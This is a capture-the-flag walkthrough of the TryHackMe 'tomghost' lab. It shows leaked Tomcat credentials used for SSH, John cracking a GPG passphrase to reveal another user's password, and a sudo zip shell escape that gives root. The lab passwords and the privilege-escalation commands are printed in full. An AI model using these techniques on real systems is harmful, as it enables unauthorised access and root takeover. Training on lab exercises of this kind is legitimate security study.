```
tomghost

Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.
https://tryhackme.com/room/tomghost

```

First we start off with the classic, nmap + Gobuster scan.


We see that tomcat is full default settings, maybe we can find online if there are some overly exposed config files present in this tomcat version.
`skyfuck:8730281lkjlkjdqlksalks`

You can use these credentials to SSH To the machine successfully (for some reason)
password: 8730281lkjlkjdqlksalks

ssh skyfuck@10.10.40.61

Run John to decypher the passphrase to unlock the credentials.gpg

I made a webserver on the remote host to extract the files.
  ``python3 -m "http.server"``  
After downloading both files i used john to try and decode the .pgp encoded file.

``john --wordlist=/usr/share/wordlists/rockyou.txt john_hash``

This produces our password; this in turn lets us decrypt the credentials.gpg

``merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j``

After we switch to the "merlin" user using that password, we'll re-iterate with linpeas.sh see if we can escalate privilegdes.

We check the first thing `sudo -l` to see if anything exploitable can be run as root, and we see we are allowed to run zip, we check GTFOBins and see that zip can be easily escaped using this code:

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

This gives us a interactive # shell, and we can cat /root/root.txt for the final flag.
